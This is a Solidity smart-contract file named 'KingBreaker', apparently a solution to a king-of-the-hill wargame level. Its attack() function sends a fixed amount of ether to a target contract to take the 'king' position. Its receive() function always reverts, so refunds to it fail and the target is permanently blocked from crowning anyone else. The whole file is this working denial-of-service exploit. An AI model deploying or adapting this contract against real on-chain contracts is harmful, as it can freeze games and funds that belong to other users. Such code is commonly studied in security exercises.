pragma solidity ^0.8.0;

contract KingBreaker {

    constructor() {}

    function attack(address payable _king_contract) external {
        _king_contract.call{value: 1500000000000000 wei}("");
    }

    function donate() external payable {}

    receive() external payable {
        revert();
    }
}
